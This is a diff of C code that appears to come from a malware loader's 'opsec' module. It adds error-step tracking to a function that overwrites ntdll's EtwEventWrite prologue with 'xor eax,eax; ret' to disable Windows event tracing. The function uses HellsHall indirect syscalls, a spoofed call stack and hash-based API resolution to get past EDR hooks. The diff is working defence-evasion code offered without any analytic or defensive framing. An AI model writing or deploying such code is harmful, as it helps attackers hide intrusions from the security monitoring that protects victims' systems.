@@ -9,6 +9,9 @@
 /* NtProtectVirtualMemory typedef — mirrors the one in Stub.cpp */
 typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 
+/* Identifies which PatchEtw step failed; caller maps it to a distinct exit code. */
+DWORD g_EtwFailStep = 0;
+
 /* ============================================================
  *  Opsec_PatchEtw
  *
@@ -25,9 +28,10 @@ typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG
  *    channel for the lifetime of the process.
  *
  *  Implementation notes:
- *    - GetModuleHandleH(g_Hash_ntdll) → process ntdll (hooked/mapped in our
- *      process), NOT the clean KnownDlls mapping used by Syscalls_Init().
- *      We want to patch the process copy, not the shared section object.
+ *    - GetModuleHandleH(g_Hash_ntdll) resolves the process ntdll, which is
+ *      the same image whose .text we want to patch.  Syscalls_Init() also
+ *      reads from process ntdll for SSN derivation and trampoline lookup —
+ *      both paths converge on the same module.
  *    - NtProtectVirtualMemory is called via HellsHall (indirect syscall +
  *      spoofed call stack) to avoid the EDR's hook on that function.
  *    - NtProtect may round the base address down to page boundary; a
@@ -38,33 +42,29 @@ typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG
  * ============================================================ */
 BOOL Opsec_PatchEtw(void)
 {
-    /* 1. Locate process ntdll — the one with EDR hooks (not KnownDlls) */
+    g_EtwFailStep = 0;
+
     HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
-    if (!hNtdll) return FALSE;
+    if (!hNtdll) { g_EtwFailStep = 1; return FALSE; }
 
-    /* 2. Resolve EtwEventWrite address from process ntdll export table */
     PBYTE pEtw = (PBYTE)GetProcAddressH(hNtdll, g_Hash_EtwEventWrite);
-    if (!pEtw) return FALSE;
+    if (!pEtw) { g_EtwFailStep = 2; return FALSE; }
 
-    /* 3. Resolve NtProtectVirtualMemory SSN + clean trampoline via HellsHall */
     DWORD dwProtectSsn       = 0;
     PVOID pProtectTrampoline = NULL;
     if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory,
                                   &dwProtectSsn, &pProtectTrampoline))
-        return FALSE;
+    { g_EtwFailStep = 3; return FALSE; }
 
     pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;
 
-    /* pPage is passed to NtProtect as PVOID* — the kernel rounds it down to
-     * page boundary and may update the value.  Keep pEtw intact for the write. */
     PVOID  pPage      = (PVOID)pEtw;
-    SIZE_T regionSize = 8;      /* covers 3-byte patch with page-alignment room */
+    SIZE_T regionSize = 8;
     ULONG  dwOldProtect = 0;
 
-    /* 4. Flip page: RX → RW (open write window — no execute bit needed for the write itself) */
 	SetSyscallParams(dwProtectSsn, pProtectTrampoline);
     NTSTATUS st = pNtProtect((HANDLE)-1, &pPage, &regionSize, PAGE_READWRITE, &dwOldProtect);
-    if (!NT_SUCCESS(st)) return FALSE;
+    if (!NT_SUCCESS(st)) { g_EtwFailStep = 4; return FALSE; }
 
     /* 5. Write patch: xor eax,eax (33 C0) + ret (C3)
      *    Overwrites the first 3 bytes of EtwEventWrite's prologue.
